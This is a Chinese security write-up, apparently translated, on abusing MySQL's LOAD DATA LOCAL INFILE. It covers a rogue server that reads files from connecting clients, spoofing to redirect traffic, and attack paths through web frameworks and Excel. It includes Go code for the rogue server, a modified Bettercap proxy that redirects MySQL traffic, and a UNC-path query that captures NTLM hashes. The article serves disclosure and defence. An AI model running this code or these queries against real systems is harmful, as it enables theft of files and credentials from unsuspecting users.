        loadData := string(clientCapabilities[8])
        log.Info("Can Use LOAD DATA LOCAL: %s", loadData)
        username := bytes.Split(b[36:], []byte{0})[0]
        log.Info("MySQL Login Request Username: %s", username)
        // send initial responseOK
        conn.Write([]byte(FirstResponseOK))
        bufio.NewReader(conn).Read(b)
        conn.Write([]byte(GetFile))
        infileLen, err := bufio.NewReader(conn).Read(b)
        if err != nil {
            log.Warning("Error while reading buffer: %s", err)
            continue
        }
        // check if the infile is an UNC path
        if strings.HasPrefix(mysql.infile, "\") {
            log.Info("NTLM from '%s' relayed to %s", remoteAddress, mysql.infile)
        } else {
            // print the infile content, ignore mysql protocol headers
            // TODO: include binary support and output to a file
            log.Info("Retrieving '%s' from %s (%d bytes)n%s", mysql.infile, remoteAddress, infileLen-9, string(b)[4:infileLen-4])
        }
        // send additional response
        conn.Write([]byte(SecondResponseOK))
        bufio.NewReader(conn).Read(b)
        }
        defer conn.Close()
        (...)
模块的执行效果如下所示：
模块包含如下选项：
值得一提的是，`INFILE`格式同样支持UNC路径，如果我们的恶意MySQL服务器运行在Windows系统上，我们还有可能使用如下查询语句获取net-NTLM哈希值：
    LOAD DATA LOCAL INFILE '\\172.16.136.153\test' into table mysql.test FIELDS TERMINATED BY "n";
演示该技术的示例视频如下所示：
如果我们在网络中有较高权限，可以执行DNS或者ARP欺骗攻击，那么我们还可以将MySQL流量从合法的数据库重定向到我们自己的恶意服务器，然后再读取客户端上的任意文件。
目前就我所知，单单使用Bettercap时我们无法简单地将TCP流量从主机A重定向到主机B。我稍微修改了[tcp_proxy.go](https://github.com/bettercap/bettercap/blob/master/modules/tcp_proxy.go)源码，这样就能处理这种情况：
    func (p *TcpProxy) handleConnection(c *net.TCPConn) {
        defer c.Close()
        log.Info("TCP proxy got a connection from %s", c.RemoteAddr().String())
        /////////////////////////////////////////////////////////
        // Quick hack to redirect TCP traffic to our rogue server
        redirAddress := "192.168.1.124"
        redirPort := 3306
        p.remoteAddr, _ = net.ResolveTCPAddr("tcp", fmt.Sprintf("%s:%d", redirAddress, redirPort))
        // end of hack
        /////////////////////////////////////////////////////////
        remote, err := net.DialTCP("tcp", nil, p.remoteAddr)
        if err != nil {
            log.Warning("Error while connecting to remote %s: %s", p.remoteAddr.String(), err)
            return
        }
        defer remote.Close()
        wg := sync.WaitGroup{}
        wg.Add(2)
        // start pipeing
        go p.doPipe(c.RemoteAddr(), p.remoteAddr, c, remote, &wg)
        go p.doPipe(p.remoteAddr, c.RemoteAddr(), remote, c, &wg)
        wg.Wait()
    }
ARP欺骗以及MySQL `LOAD DATA LOCAL INFILE`的实际效果如以下视频所示：
我向该项目发起了一个pull请求，添加MySQL恶意服务器功能，希望@evilsocket能接受该请求。如果pull请求被接受，我还想询问他们转发TCP流量的最好方式（是否可以使用另一个模块或者设置TCP代理选项）。一旦官方给出解决方案，我会及时更新这篇文章。
## 五、MySQL命令行客户端
通过Homebrew/macOS安装的mysql客户端（mysql: stable 5.7.21, devel 8.0.4-rc）正确处理了`LOCAL-INFILE`标志，除非我们显式启用该标志，否则无法读取客户端文件：
处于某种原因，某些客户端（如Ubuntu默认的mysql-client，本文撰写时版本号为5.7.21-0ubuntu0.17.10.1）会在连接过程中自动设置这个标志：
Windows上MySQL Workbench绑定的客户端同样存在这种情况，我们不需要启用这个标志就能读取本地文件：
## 六、滥用Web框架读取服务器文件
某些程序库、Web框架以及MySQL connectors（连接器）中同样默认存在这种不安全行为：这些目标中大多数会默认启用`LOCAL-INFILE`标志。在这种情况下，当某个Web用户修改包含MySQL主机的一个表单（form），将其指向恶意服务器时，他就可以读取系统上的本地文件。
这个功能在Monitor类或者Dashboard类应用以及框架的安装脚本中非常常见，用户可以使用该功能，通过管理员面板及时设置数据库。
好消息是，大多数Web应用会做些限制，只有管理员用户才能修改MySQL设置。坏消息是，我们的管理员账户很容易会被XSS/CSRF/点击劫持攻击利用。我快速调研了可以滥用的某些PHP框架，整体情况如下：
###  Joomla v3.8.7
###  WordPress v4.9.5
###  Zabbix v3.4.8
###  Drupal v8.5.2（不受影响）
## 七、滥用Excel MySQL Connector
如果我们在Windows主机上安装了Microsoft Office以及[MySQL
Connector/Net](https://dev.mysql.com/downloads/connector/net/)，就有可能创建连接到MySQL恶意服务器的一个电子表格。安装[Windows
MySQL
installer](https://dev.mysql.com/downloads/installer/)时默认会安装connector，如果我们使用某款工具连接或者管理MySQL数据库，或者主机上正在运行MySQL服务器时，很有可能已经安装了这个工具。
为了创建能连接到MySQL服务器的一个文档，我们需要转到Data标签页，选择New Query>From Database>From MySQL
Database。输入服务器信息、用户名、密码、查询语句然后保存文件即可。
如果用户从互联网上下载文件，那么需要启用文档的编辑模式才能与远程服务器交互。因为某些原因，我们需要关闭然后重新打开Excel，才能让查询语句生效。此外，Excel只会在第一次打开文件时显示安全警告信息，当用户启用外部内容时不会再提示这个信息。演示视频如下：
##
## 八、总结
虽然Duo Security之前披露了[BACKRONYM MySQL漏洞](https://duo.com/blog/backronym-mysql-vulnerability)，但貌似这样并没有促使人们在连接MySQL服务器时强制使用正确的加密机制。Web应用以及框架很少支持MySQL连接的加密以及TLS验证功能。未加密的协议本身并不安全，只需要提供密码散列以及成功的认证握手过程，任何人都可以成功[登录](https://github.com/cyrus-and/mysql-unsha1)服务器。
在默认情况下，MySQL库以及connectors应当使用安全模式，禁用`LOCAL-INFILE`支持。我非常喜欢[Go MySQL
Driver](https://github.com/go-sql-driver/mysql)的处理方式：它通过白名单机制支持`LOCAL-INFILE`，并且官方文档中明确指出这个功能“可能并不安全”。
蜜罐以及漏洞扫描器也可以滥用这个功能‘，如果扫描器扫描你的MySQL主机时，可以使用这个功能黑掉你的安全工具，这将是非常有趣的一件事情。如果应用程序注册了MySQL
URI处理函数，那么我们的系统很有可能因为某个网站链接就城门大开。
滥用MySQL客户端的另一种有趣的方法就是降级（downgrade）攻击，攻击者可以将目标切换成较老的、带有不安全密码认证机制的版本，然后验证目标的工作方式。但这属于另一个话题，不再赘述。